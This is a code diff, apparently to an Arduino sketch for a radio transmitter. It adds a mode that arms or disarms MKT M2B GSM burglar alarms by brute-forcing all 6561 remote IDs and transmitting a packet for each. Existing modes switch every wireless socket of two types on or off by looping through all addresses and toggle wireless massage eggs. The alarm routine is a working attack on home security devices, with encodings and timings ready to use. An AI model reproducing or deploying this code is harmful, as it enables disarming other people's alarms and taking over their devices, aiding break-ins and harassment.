@@ -57,28 +57,36 @@ void loop() {
     // Button was released after a mode was selected.
     switch (modeCounter) {
       case 1:
-        // Turn on wireless massage eggs.
-        wirelessMassageEggsOn();
-        break;
-      case 2:
-        // Turn off wireless massage eggs.
-        wirelessMassageEggsOff();
-        break;
-      case 3:
         // Turn on all wireless sockets (type "A").
         wirelessSocketsTypeAOn();
         break;
-      case 4:
+      case 2:
         // Turn off all wireless sockets (type "A").
         wirelessSocketsTypeAOff();
         break;
-      case 5:
+      case 3:
         // Turn on all wireless sockets (type "B").
         wirelessSocketsTypeBOn();
         break;
-      case 6:
+      case 4:
         // Turn off all wireless sockets (type "B").
         wirelessSocketsTypeBOff();
+        break;
+      case 5:
+        // Arm all MKT alarms.
+        armMKTAlarm();
+        break;
+      case 6:
+        // Disarm all MKT alarms.
+        disarmMKTAlarm();
+        break;
+      case 7:
+        // Turn on wireless massage eggs.
+        wirelessMassageEggsOn();
+        break;
+      case 8:
+        // Turn off wireless massage eggs.
+        wirelessMassageEggsOff();
         break;
     }
     // Reset the mode counter.
@@ -141,28 +149,68 @@ void transmitData(char* data, int len, int duration, int repeat, int repeatDelay
 
 
 // #################################################################################
-// Mode: Wireless massage eggs                                                     #
-// Details: https://github.com/ikarus23/wireless_massage_egg/tree/master/gnuradio  #
-// Product: http://www.amazon.de/dp/B001JS4GV6/                                    #
+// Mode: MKT MKT M2B GSM alarm system                                              #
+// Details: TODO                                                                   #
+// Product: http://www.amazon.de/dp/B00BY2DFNM/                                    #
 // #################################################################################
 
 
 /**
- * Transmit an "on" package to wireless massage eggs.
- * Details: https://github.com/ikarus23/wireless_massage_egg/tree/master/gnuradio
+ * Transmit an "arm" package to the MKT alarm system.
  */
-void wirelessMassageEggsOn() {
-  char data[] = {0xF2, 0xCB, 0x64, 0xB6, 0xD9, 0x6C, 0x90};
-  transmitData(data, 7, 600, 4, 0);
+void armMKTAlarm() {
+  generateAndSendPacketMKTAlarm(1);
 }
 
 
 /**
- * Transmit an "off" package to wireless massage eggs.
+ * Transmit an "disarm" package to the MKT alarm system.
  */
-void wirelessMassageEggsOff() {
-  char data[] = {0xF2, 0xCB, 0x64, 0xB6, 0x59, 0x25, 0x90};
-  transmitData(data, 7, 600, 4, 0);
+void disarmMKTAlarm() {
+  generateAndSendPacketMKTAlarm(0);
+}
+
+
+/**
+ * Generate and send packets to arm or to disarm all MKT M2B GSM alarm systems.
+ * This is done by brute-forcing the ID of all remotes. The "bits" of the ID
+ * can have 3 differnet states:
+ *   0x8E = Floating
+ *   0x88 = 0
+ *   0xEE = 1
+ */
+ void generateAndSendPacketMKTAlarm(char state) {
+  int addr = 0;
+  int i = 0;
+  int j = 0;
+  char states[3] = {0x88, 0xEE, 0x8E};
+  char indices[8] = {0};
+  // Init address with 0.
+  // Default state is "disarm" (bit 8-11).
+  char data[13] = {0, 0, 0, 0, 0, 0, 0, 0, 0x88, 0x88, 0xEE, 0x88, 0x80};
+  if (state == 1) {
+    // Switch to arm state.
+    char stateBytes[4] = {0xEE, 0x88, 0x88, 0x88};
+    memcpy(data+8, stateBytes, 4);
+  }
+
+  // Loop through all addresses.
+  for (addr = 0; addr < 6561; addr++) { // 8 address "bits" -> 0, 1 or floating -> 3^8.
+    // Increment with carry.
+    indices[0]++;
+    i = 0;
+    while (indices[i] == 3) {
+      indices[i] = 0;
+      indices[++i]++;
+    }
+    // Encode as 8 byte address.
+    j = 0;
+    for (i = 0; i < 8; i++) {
+      data[i] = states[indices[i]];
+    }
+    // Send packet.
+    transmitData(data, 13, 475, 5, 10375);
+   }
 }
 
 
@@ -200,7 +248,7 @@ void wirelessSocketsTypeAOff() {
 void generateAndSendPacketTypeA(char state) {
   int addr = 0;
   char data[13] = {0};
-  char emptyID[] = {0x8e, 0x8e, 0x8e, 0x8e, 0x8e};
+  char emptyID[] = {0x8E, 0x8E, 0x8E, 0x8E, 0x8E};
   int i = 0;
   int j = 0;
   // Loop through all addresses.
@@ -211,7 +259,7 @@ void generateAndSendPacketTypeA(char state) {
       if ((addr >> i) & 0x01 == 1) {
         data[j++] = 0x88;
       } else {
-        data[j++] = 0x8e;
+        data[j++] = 0x8E;
       }
     }
     // Loop through identifiers.
@@ -221,9 +269,9 @@ void generateAndSendPacketTypeA(char state) {
       // Set the state.
       if (state == 1) {
         data[j+5] = 0x88;
-        data[j+6] = 0x8e;
+        data[j+6] = 0x8E;
       } else {
-        data[j+5] = 0x8e;
+        data[j+5] = 0x8E;
         data[j+6] = 0x88;
       }
       data [j+7] = 0x80;
@@ -279,4 +327,30 @@ void generateAndSendPacketTypeB(char* state) {
     packet[9] = state[2];
     transmitData(packet, 10, 300, 3, 5700);
   }
+}
+
+
+// #################################################################################
+// Mode: Wireless massage eggs                                                     #
+// Details: https://github.com/ikarus23/wireless_massage_egg/tree/master/gnuradio  #
+// Product: http://www.amazon.de/dp/B001JS4GV6/                                    #
+// #################################################################################
+
+
+/**
+ * Transmit an "on" package to wireless massage eggs.
+ * Details: https://github.com/ikarus23/wireless_massage_egg/tree/master/gnuradio
+ */
+void wirelessMassageEggsOn() {
+  char data[] = {0xF2, 0xCB, 0x64, 0xB6, 0xD9, 0x6C, 0x90};
+  transmitData(data, 7, 600, 4, 0);
+}
+
+
+/**
+ * Transmit an "off" package to wireless massage eggs.
+ */
+void wirelessMassageEggsOff() {
+  char data[] = {0xF2, 0xCB, 0x64, 0xB6, 0x59, 0x25, 0x90};
+  transmitData(data, 7, 600, 4, 0);
 }
